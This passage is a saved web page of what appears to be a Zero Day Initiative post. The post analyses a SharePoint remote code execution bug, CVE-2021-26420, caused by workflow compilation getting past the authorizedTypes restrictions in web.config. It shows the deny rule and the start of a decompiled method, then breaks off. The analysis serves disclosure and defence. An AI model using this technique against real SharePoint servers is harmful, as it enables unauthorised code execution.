Polynesia","code":"PF","phoneCode":"+689"},{"name":"Gabon","code":"GA","phoneCode":"+241"},{"name":"Gambia","code":"GM","phoneCode":"+220"},{"name":"Georgia","code":"GE","phoneCode":"+995"},{"name":"Germany","code":"DE","phoneCode":"+49"},{"name":"Ghana","code":"GH","phoneCode":"+233"},{"name":"Gibraltar","code":"GI","phoneCode":"+350"},{"name":"Greece","code":"GR","phoneCode":"+30"},{"name":"Greenland","code":"GL","phoneCode":"+299"},{"name":"Grenada","code":"GD","phoneCode":"+1"},{"name":"Guadeloupe","code":"GP","phoneCode":"+590"},{"name":"Guam","code":"GU","phoneCode":"+1"},{"name":"Guatemala","code":"GT","phoneCode":"+502"},{"name":"Guernsey","code":"GG","phoneCode":"+44"},{"name":"Guinea","code":"GN","phoneCode":"+224"},{"name":"Guinea-Bissau","code":"GW","phoneCode":"+245"},{"name":"Guyana","code":"GY","phoneCode":"+592"},{"name":"Haiti","code":"HT","phoneCode":"+509"},{"name":"Honduras","code":"HN","phoneCode":"+504"},{"name":"Hong Kong SAR China","code":"HK","phoneCode":"+852"},{"name":"Hungary","code":"HU","phoneCode":"+36"},{"name":"Iceland","code":"IS","phoneCode":"+354"},{"name":"India","code":"IN","phoneCode":"+91"},{"name":"Indonesia","code":"ID","phoneCode":"+62"},{"name":"Iran","code":"IR","phoneCode":"+98"},{"name":"Iraq","code":"IQ","phoneCode":"+964"},{"name":"Ireland","code":"IE","phoneCode":"+353"},{"name":"Isle of Man","code":"IM","phoneCode":"+44"},{"name":"Israel","code":"IL","phoneCode":"+972"},{"name":"Italy","code":"IT","phoneCode":"+39"},{"name":"Jamaica","code":"JM","phoneCode":"+1"},{"name":"Japan","code":"JP","phoneCode":"+81"},{"name":"Jersey","code":"JE","phoneCode":"+44"},{"name":"Jordan","code":"JO","phoneCode":"+962"},{"name":"Kazakhstan","code":"KZ","phoneCode":"+7"},{"name":"Kenya","code":"KE","phoneCode":"+254"},{"name":"Kiribati","code":"KI","phoneCode":"+686"},{"name":"Kosovo","code":"XK","phoneCode":"+383"},{"name":"Kuwait","code":"KW","phoneCode":"+965"},{"name":"Kyrgyzstan","code":"KG","phoneCode":"+996"},{"name":"Laos","code":"LA","phoneCode":"+856"},{"name":"Latvia","code":"LV","phoneCode":"+371"},{"name":"Lebanon","code":"LB","phoneCode":"+961"},{"name":"Lesotho","code":"LS","phoneCode":"+266"},{"name":"Liberia","code":"LR","phoneCode":"+231"},{"name":"Libya","code":"LY","phoneCode":"+218"},{"name":"Liechtenstein","code":"LI","phoneCode":"+423"},{"name":"Lithuania","code":"LT","phoneCode":"+370"},{"name":"Luxembourg","code":"LU","phoneCode":"+352"},{"name":"Macao SAR China","code":"MO","phoneCode":"+853"},{"name":"Madagascar","code":"MG","phoneCode":"+261"},{"name":"Malawi","code":"MW","phoneCode":"+265"},{"name":"Malaysia","code":"MY","phoneCode":"+60"},{"name":"Maldives","code":"MV","phoneCode":"+960"},{"name":"Mali","code":"ML","phoneCode":"+223"},{"name":"Malta","code":"MT","phoneCode":"+356"},{"name":"Marshall Islands","code":"MH","phoneCode":"+692"},{"name":"Martinique","code":"MQ","phoneCode":"+596"},{"name":"Mauritania","code":"MR","phoneCode":"+222"},{"name":"Mauritius","code":"MU","phoneCode":"+230"},{"name":"Mayotte","code":"YT","phoneCode":"+262"},{"name":"Mexico","code":"MX","phoneCode":"+52"},{"name":"Micronesia","code":"FM","phoneCode":"+691"},{"name":"Moldova","code":"MD","phoneCode":"+373"},{"name":"Monaco","code":"MC","phoneCode":"+377"},{"name":"Mongolia","code":"MN","phoneCode":"+976"},{"name":"Montenegro","code":"ME","phoneCode":"+382"},{"name":"Montserrat","code":"MS","phoneCode":"+1"},{"name":"Morocco","code":"MA","phoneCode":"+212"},{"name":"Mozambique","code":"MZ","phoneCode":"+258"},{"name":"Myanmar (Burma)","code":"MM","phoneCode":"+95"},{"name":"Namibia","code":"NA","phoneCode":"+264"},{"name":"Nauru","code":"NR","phoneCode":"+674"},{"name":"Nepal","code":"NP","phoneCode":"+977"},{"name":"Netherlands","code":"NL","phoneCode":"+31"},{"name":"New Caledonia","code":"NC","phoneCode":"+687"},{"name":"New Zealand","code":"NZ","phoneCode":"+64"},{"name":"Nicaragua","code":"NI","phoneCode":"+505"},{"name":"Niger","code":"NE","phoneCode":"+227"},{"name":"Nigeria","code":"NG","phoneCode":"+234"},{"name":"Niue","code":"NU","phoneCode":"+683"},{"name":"Norfolk Island","code":"NF","phoneCode":"+672"},{"name":"Northern Mariana Islands","code":"MP","phoneCode":"+1"},{"name":"North Korea","code":"KP","phoneCode":"+850"},{"name":"North Macedonia","code":"MK","phoneCode":"+389"},{"name":"Norway","code":"NO","phoneCode":"+47"},{"name":"Oman","code":"OM","phoneCode":"+968"},{"name":"Pakistan","code":"PK","phoneCode":"+92"},{"name":"Palau","code":"PW","phoneCode":"+680"},{"name":"Palestinian Territories","code":"PS","phoneCode":"+970"},{"name":"Panama","code":"PA","phoneCode":"+507"},{"name":"Papua New Guinea","code":"PG","phoneCode":"+675"},{"name":"Paraguay","code":"PY","phoneCode":"+595"},{"name":"Peru","code":"PE","phoneCode":"+51"},{"name":"Philippines","code":"PH","phoneCode":"+63"},{"name":"Poland","code":"PL","phoneCode":"+48"},{"name":"Portugal","code":"PT","phoneCode":"+351"},{"name":"Puerto Rico","code":"PR","phoneCode":"+1"},{"name":"Qatar","code":"QA","phoneCode":"+974"},{"name":"R\u00E9union","code":"RE","phoneCode":"+262"},{"name":"Romania","code":"RO","phoneCode":"+40"},{"name":"Russia","code":"RU","phoneCode":"+7"},{"name":"Rwanda","code":"RW","phoneCode":"+250"},{"name":"Samoa","code":"WS","phoneCode":"+685"},{"name":"San Marino","code":"SM","phoneCode":"+378"},{"name":"S\u00E3o Tom\u00E9 & Pr\u00EDncipe","code":"ST","phoneCode":"+239"},{"name":"Saudi Arabia","code":"SA","phoneCode":"+966"},{"name":"Senegal","code":"SN","phoneCode":"+221"},{"name":"Serbia","code":"RS","phoneCode":"+381"},{"name":"Seychelles","code":"SC","phoneCode":"+248"},{"name":"Sierra Leone","code":"SL","phoneCode":"+232"},{"name":"Singapore","code":"SG","phoneCode":"+65"},{"name":"Sint Maarten","code":"SX","phoneCode":"+1"},{"name":"Slovakia","code":"SK","phoneCode":"+421"},{"name":"Slovenia","code":"SI","phoneCode":"+386"},{"name":"Solomon Islands","code":"SB","phoneCode":"+677"},{"name":"Somalia","code":"SO","phoneCode":"+252"},{"name":"South Africa","code":"ZA","phoneCode":"+27"},{"name":"South Korea","code":"KR","phoneCode":"+82"},{"name":"South Sudan","code":"SS","phoneCode":"+211"},{"name":"Spain","code":"ES","phoneCode":"+34"},{"name":"Sri Lanka","code":"LK","phoneCode":"+94"},{"name":"St. Barth\u00E9lemy","code":"BL","phoneCode":"+590"},{"name":"St. Helena","code":"SH","phoneCode":"+290"},{"name":"St. Kitts & Nevis","code":"KN","phoneCode":"+1"},{"name":"St. Lucia","code":"LC","phoneCode":"+1"},{"name":"St. Martin","code":"MF","phoneCode":"+590"},{"name":"St. Pierre & Miquelon","code":"PM","phoneCode":"+508"},{"name":"St. Vincent & Grenadines","code":"VC","phoneCode":"+1"},{"name":"Sudan","code":"SD","phoneCode":"+249"},{"name":"Suriname","code":"SR","phoneCode":"+597"},{"name":"Svalbard & Jan Mayen","code":"SJ","phoneCode":"+47"},{"name":"Sweden","code":"SE","phoneCode":"+46"},{"name":"Switzerland","code":"CH","phoneCode":"+41"},{"name":"Syria","code":"SY","phoneCode":"+963"},{"name":"Taiwan","code":"TW","phoneCode":"+886"},{"name":"Tajikistan","code":"TJ","phoneCode":"+992"},{"name":"Tanzania","code":"TZ","phoneCode":"+255"},{"name":"Thailand","code":"TH","phoneCode":"+66"},{"name":"Timor-Leste","code":"TL","phoneCode":"+670"},{"name":"Togo","code":"TG","phoneCode":"+228"},{"name":"Tokelau","code":"TK","phoneCode":"+690"},{"name":"Tonga","code":"TO","phoneCode":"+676"},{"name":"Trinidad & Tobago","code":"TT","phoneCode":"+1"},{"name":"Tristan da Cunha","code":"TA","phoneCode":"+290"},{"name":"Tunisia","code":"TN","phoneCode":"+216"},{"name":"T\u00FCrkiye","code":"TR","phoneCode":"+90"},{"name":"Turkmenistan","code":"TM","phoneCode":"+993"},{"name":"Turks & Caicos Islands","code":"TC","phoneCode":"+1"},{"name":"Tuvalu","code":"TV","phoneCode":"+688"},{"name":"U.S. Virgin Islands","code":"VI","phoneCode":"+1"},{"name":"Uganda","code":"UG","phoneCode":"+256"},{"name":"Ukraine","code":"UA","phoneCode":"+380"},{"name":"United Arab Emirates","code":"AE","phoneCode":"+971"},{"name":"United Kingdom","code":"GB","phoneCode":"+44"},{"name":"United States","code":"US","phoneCode":"+1"},{"name":"Uruguay","code":"UY","phoneCode":"+598"},{"name":"Uzbekistan","code":"UZ","phoneCode":"+998"},{"name":"Vanuatu","code":"VU","phoneCode":"+678"},{"name":"Vatican City","code":"VA","phoneCode":"+39"},{"name":"Venezuela","code":"VE","phoneCode":"+58"},{"name":"Vietnam","code":"VN","phoneCode":"+84"},{"name":"Wallis & Futuna","code":"WF","phoneCode":"+681"},{"name":"Western Sahara","code":"EH","phoneCode":"+212"},{"name":"Yemen","code":"YE","phoneCode":"+967"},{"name":"Zambia","code":"ZM","phoneCode":"+260"},{"name":"Zimbabwe","code":"ZW","phoneCode":"+263"}]},"localizedStrings":{"validation":{"noValidSelection":"A valid selection must be made.","invalidUrl":"Must be a valid URL.","stringTooLong":"Value should have a length no longer than {0}.","containsInvalidKey":"{0} contains an invalid key.","invalidTwitterUsername":"Must be a valid Twitter username.","valueOutsideRange":"Value must be in the range {0} to {1}.","invalidPassword":"Passwords should not contain whitespace.","missingRequiredSubfields":"{0} is missing required subfields: {1}","invalidCurrency":"Currency value should be formatted like 1234 or 123.99.","invalidMapSize":"Value should contain exactly {0} elements.","subfieldsRequired":"All fields in {0} are required.","formSubmissionFailed":"Form submission failed. Review the following information: {0}.","invalidCountryCode":"Country code should have an optional plus and up to 4 digits.","invalidDate":"This is not a real date.","required":"{0} is required.","invalidStringLength":"Value should be {0} characters long.","invalidEmail":"Email addresses should follow the format user@domain.com.","invalidListLength":"Value should be {0} elements long.","allEmpty":"Please fill out at least one form field.","missingRequiredQuestion":"Missing a required question.","invalidQuestion":"Contained an invalid question.","captchaFailure":"Captcha validation failed. Please try again.","stringTooShort":"Value should have a length of at least {0}.","invalid":"{0} is not valid.","formErrors":"Form Errors","containsInvalidValue":"{0} contains an invalid value.","invalidUnsignedNumber":"Numbers must contain only digits and no other characters.","invalidName":"Valid names contain only letters, numbers, spaces, ', or - characters."},"submit":"Submit","status":{"title":"{@} Block","learnMore":"Learn more"},"name":{"firstName":"First Name","lastName":"Last Name"},"lightbox":{"openForm":"Open Form"},"likert":{"agree":"Agree","stronglyDisagree":"Strongly Disagree","disagree":"Disagree","stronglyAgree":"Strongly Agree","neutral":"Neutral"},"time":{"am":"AM","second":"Second","pm":"PM","minute":"Minute","amPm":"AM/PM","hour":"Hour"},"notFound":"Form not found.","date":{"yyyy":"YYYY","year":"Year","mm":"MM","day":"Day","month":"Month","dd":"DD"},"phone":{"country":"Country","number":"Number","prefix":"Prefix","areaCode":"Area Code","line":"Line"},"submitError":"Unable to submit form. Please try again later.","address":{"stateProvince":"State/Province","country":"Country","zipPostalCode":"Zip/Postal Code","address2":"Address 2","address1":"Address 1","city":"City"},"email":{"signUp":"Sign up for news and updates"},"cannotSubmitDemoForm":"This is a demo form and cannot be submitted.","required":"(required)","invalidData":"Invalid form data."}}};</script><script>Squarespace.load(window);</script>
<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://www.thezdi.com/blog?format=rss">
<script type="application/ld+json">{"url":"https://www.thezdi.com","name":"Zero Day Initiative","description":"","@context":"http://schema.org","@type":"WebSite"}</script><script type="application/ld+json">{"address":"","@context":"http://schema.org","@type":"LocalBusiness"}</script><script type="application/ld+json">{"name":"Zero Day Initiative \u2014 CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation","url":"https://www.thezdi.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation","datePublished":"2021-10-06T11:30:49-0500","dateModified":"2021-10-06T11:30:50-0500","headline":"CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation","author":"The ZDI Research Team","publisher":{"name":"Zero Day Initiative","logo":{"@type":"ImageObject"},"@context":"http://schema.org","@type":"Organization"},"image":"http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w","@context":"http://schema.org","@type":"Article"}</script><link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/site.css"><script>
if (window.location.host == "www.thezdi.com") {window.location = "https://www.zerodayinitiative.com" + window.location.pathname}</script><script>Static.COOKIE_BANNER_CAPABLE = true;</script>
<script async="" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/js(1)"></script><script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('set', 'developer_id.dZjQwMz', true);gtag('config', 'UA-93169700-1');</script><!-- End of Squarespace Headers -->
    <link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/main.css">
</head>
<body class="home" id="yui_3_17_2_1_1762949703938_101">


<div id="nav" class="group">
    <div id="navContent">
        <div class="nav__container">
            <div class="nav__header">
                <div class="global-header__logo">
                    <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/logo-combo.svg" alt="thezdi"></a>
                </div>
                <div id="mobileNavIcon" class="js-mobile-nav-toggle">Menu</div>
                <div id="mobileOverlay"></div>
            </div>
            <nav class="nav__list" role="main-navigation">
                <ul class="list-no-bullets">
                    <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy">PRIVACY</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
                    <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
                    <li class="nav__tier1 userActions">
                        <a href="https://www.zerodayinitiative.com/portal/">LOG IN</a>
                        <a href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a>
                    </li>
                    <li>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
</div>

<!-- Begin Off Canvas Menu-->
<div class="off-canvas">
    <nav class="off-canvas__list" role="main-navigation2">
        <div class="js-mobile-nav-toggle">Menu</div>
        <ul class="topMenu">
            <li class="nav__tier1"><a href="https://www.trendmicro.com/privacy/">PRIVACY</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/">WHO WE ARE</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/about/benefits/">HOW IT WORKS</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/blog/">BLOG</a></li>
            <li class="nav__tier1"><a href="https://www.zerodayinitiative.com/advisories/">ADVISORIES</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/">LOG IN</a></li>
            <li class="nav__tier1"><a class="sign-in" href="https://www.zerodayinitiative.com/portal/register/">SIGN UP</a></li>
        </ul>
        <ul class="bottomMenu">
            <li class="nav__tier1">
                <a href="https://www.trendmicro.com/"><img src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/logo-trend.svg" alt="Trend Micro"></a>
            </li>
            <li class="nav__tier1 logo"><a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/logo-zdi.svg" alt="thezdi"></a></li>
        </ul>
    </nav>
</div>
<!-- End Off Canvas Menu -->

<div id="mainContent" class="blogDetails group subscribeAbs">
    <div id="imageMasthead" class="smaller">
        <div class="content">
            
                <h1 class="title" data-content-field="title">
                  
                CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation
                  
                </h1>
                <data>October 06, 2021  |  The ZDI Research Team</data>
            
        </div>
    </div>

            <div class="blog-listing blog-details" id="yui_3_17_2_1_1762949703938_100">
                <div class="subscribe-container">
                    <a href="https://www.zerodayinitiative.com/rss/" class="btn subscribe rounded">SUBSCRIBE</a>
                </div>
                <div class="section" id="yui_3_17_2_1_1762949703938_99">
                    <div class="contentBlock" id="yui_3_17_2_1_1762949703938_98">
                        <div class="contentBlockCopy" style="float: none;" id="yui_3_17_2_1_1762949703938_97">

                            <div class="group" style="max-width: 1000px;" id="yui_3_17_2_1_1762949703938_96">
                                <div class="sqs-layout sqs-grid-12 columns-12" data-layout-label="Post Body" data-type="item" data-updated-on="1633459113200" id="item-615c9b630ed57035c2afb952"><div class="row sqs-row" id="yui_3_17_2_1_1762949703938_95"><div class="col sqs-col-12 span-12" id="yui_3_17_2_1_1762949703938_94"><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-c8d77e7244dbc86ee981"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">In June of 2021, Microsoft released a patch to correct <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26420">CVE-20</a><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26420" target="_blank">21-264</a><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26420">20</a> – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as <a href="https://www.zerodayinitiative.com/advisories/ZDI-21-755/">ZDI-</a><a href="https://www.zerodayinitiative.com/advisories/ZDI-21-755/" target="_blank">21-7</a><a href="https://www.zerodayinitiative.com/advisories/ZDI-21-755/">55</a>. This blog takes a deeper look at the root cause of this vulnerability.</p><p class="" style="white-space:pre-wrap;">Before this patch being made available, this vulnerability could be used by an authenticated user to execute arbitrary .NET code on the server in the context and permissions of service account of SharePoint web application. For successful attack, the attacker should have “<strong><em>Manage Lists</em></strong>” permissions on any SharePoint site. By default, any authenticated user can create their own site where they have the necessary permissions.&nbsp;&nbsp;&nbsp; </p><p class="" style="white-space:pre-wrap;"><strong>The Vulnerability</strong></p><p class="" style="white-space:pre-wrap;">SharePoint <a href="https://support.microsoft.com/en-us/office/overview-of-workflows-included-with-sharepoint-d74fcceb-3a64-40fb-9904-cc33ca49da56#:~:text=SharePoint%20workflows%20are%20pre%2Dprogrammed,status%20of%20a%20routine%20procedure.">wor</a><a href="https://support.microsoft.com/en-us/office/overview-of-workflows-included-with-sharepoint-d74fcceb-3a64-40fb-9904-cc33ca49da56#:~:text=SharePoint%20workflows%20are%20pre%2Dprogrammed,status%20of%20a%20routine%20procedure." target="_blank">kfl</a><a href="https://support.microsoft.com/en-us/office/overview-of-workflows-included-with-sharepoint-d74fcceb-3a64-40fb-9904-cc33ca49da56#:~:text=SharePoint%20workflows%20are%20pre%2Dprogrammed,status%20of%20a%20routine%20procedure.">ows</a> are pre-programmed mini-applications that streamline and automate a wide variety of business processes. An organization can use workflows to attach business logic to documents or items in a SharePoint list or library. </p><p class="" style="white-space:pre-wrap;">For security purposes, Workflow Foundation (WF) on SharePoint runs workflows only when all dependent types and assemblies are authorized in the <strong><em>authorizedTypes</em></strong> list in the <strong>web.config</strong> file. Along with allowed types, this list also contains items that block specific types from allowed namespaces that are considered dangerous. One example is <strong>System.Workflow.ComponentModel.Compiler. </strong>The <strong><em>Compile()</em></strong> method offered by <strong>WorkflowCompiler</strong> compiles a workflow based on parameters. Workflows in SharePoint are normally compiled in very restricted context (no code, types restricted by the <strong><em>authorizedTypes</em></strong> list, etc.), but invoking <strong>WorkflowCompiler </strong>would allow attackers to create a new context without these restrictions by specifying appropriate parameters. Because of this, <strong>WorkflowCompiler</strong> is blocked by the <strong><em>authorizedTypes</em></strong> list in <strong>web.config</strong>:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/04792cc12f0b6af8ca3dd50c6f85474b.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_45222"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_68" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/04792cc12f0b6af8ca3dd50c6f85474b.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112200995" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-1-xml" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-xml  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-1.xml content, created by zdi-team on 02:20PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-1.xml">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-1-xml-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-1-xml-LC1" class="blob-code blob-code-inner js-file-line">&lt;<span class="pl-ent">System</span>.Workflow.ComponentModel.WorkflowCompiler&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-1-xml-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-1-xml-LC2" class="blob-code blob-code-inner js-file-line">    &lt;<span class="pl-ent">authorizedTypes</span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-1-xml-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-1-xml-LC3" class="blob-code blob-code-inner js-file-line">      &lt;<span class="pl-ent">targetFx</span> <span class="pl-e">version</span>=<span class="pl-s"><span class="pl-pds">"</span>v4.0<span class="pl-pds">"</span></span>&gt; </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-1-xml-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-1-xml-LC4" class="blob-code blob-code-inner js-file-line">        ... </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-1-xml-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-1-xml-LC5" class="blob-code blob-code-inner js-file-line">        &lt;<span class="pl-ent">authorizedType</span> <span class="pl-e">Assembly</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35<span class="pl-pds">"</span></span> <span class="pl-e">Namespace</span>=<span class="pl-s"><span class="pl-pds">"</span>System.Workflow.*<span class="pl-pds">"</span></span> <span class="pl-e">TypeName</span>=<span class="pl-s"><span class="pl-pds">"</span>WorkflowCompiler<span class="pl-pds">"</span></span> <span class="pl-e">Authorized</span>=<span class="pl-s"><span class="pl-pds">"</span>False<span class="pl-pds">"</span></span> /&gt;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/04792cc12f0b6af8ca3dd50c6f85474b/raw/7afee5ced08816fd7e1cbeb81ac609f59de0cb29/CVE-2021-26420-snippet-1.xml" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/04792cc12f0b6af8ca3dd50c6f85474b#file-cve-2021-26420-snippet-1-xml" class="Link--inTextBlock">
          CVE-2021-26420-snippet-1.xml
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_54789"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Therefore, we cannot mount an attack using <strong>WorkflowCompiler</strong> type.<strong> </strong>However, examining the .NET code of <strong>WorkflowCompiler.Compile</strong> reveals something interesting:</p>
</div>






















</div></div><div class="sqs-block embed-block sqs-block-embed" data-block-json="{&quot;hSize&quot;:null,&quot;floatDir&quot;:null,&quot;html&quot;:&quot;&lt;script src=\&quot;https://gist.github.com/9d2d3ac1d37b120664b13d133524f5a6.js\&quot;&gt;&lt;/script&gt;&quot;}" data-block-type="22" id="block-yui_3_17_2_1_1632752463728_55330"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_71" style="visibility: visible; opacity: 1; height: auto;"><script src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/9d2d3ac1d37b120664b13d133524f5a6.js.download"></script><link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/gist-embed-0ac919313390.css"><div id="gist112201060" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container">
  <div id="file-cve-2021-26420-snippet-2-cs" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="CVE-2021-26420-snippet-2.cs content, created by zdi-team on 02:22PM on October 05, 2021.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="CVE-2021-26420-snippet-2.cs">
        <tbody><tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-cve-2021-26420-snippet-2-cs-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-c">// System.Workflow.ComponentModel.Compiler.WorkflowCompiler </span></td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-cve-2021-26420-snippet-2-cs-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">public</span> <span class="pl-smi">WorkflowCompilerResults</span> <span class="pl-en">Compile</span><span class="pl-kos">(</span><span class="pl-smi">WorkflowCompilerParameters</span> <span class="pl-s1">parameters</span><span class="pl-kos">,</span> <span class="pl-k">params</span> <span class="pl-smi">string</span><span class="pl-kos">[</span><span class="pl-kos">]</span> <span class="pl-s1">files</span><span class="pl-kos">)</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-cve-2021-26420-snippet-2-cs-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-kos">{</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-cve-2021-26420-snippet-2-cs-LC4" class="blob-code blob-code-inner js-file-line">    <span class="pl-c">/*...*/</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-cve-2021-26420-snippet-2-cs-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-smi">WorkflowCompilerInternal</span> <span class="pl-s1">workflowCompilerInternal</span> <span class="pl-c1">=</span> <span class="pl-kos">(</span><span class="pl-smi">WorkflowCompilerInternal</span><span class="pl-kos">)</span><span class="pl-s1">appDomain</span><span class="pl-kos">.</span><span class="pl-en">CreateInstanceAndUnwrap</span><span class="pl-kos">(</span><span class="pl-s1">Assembly</span><span class="pl-kos">.</span><span class="pl-en">GetExecutingAssembly</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">FullName</span><span class="pl-kos">,</span> <span class="pl-k">typeof</span><span class="pl-kos">(</span><span class="pl-smi">WorkflowCompilerInternal</span><span class="pl-kos">)</span><span class="pl-kos">.</span><span class="pl-s1">FullName</span><span class="pl-kos">)</span><span class="pl-kos">;</span> </td>
        </tr>
        <tr>
          <td id="file-cve-2021-26420-snippet-2-cs-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
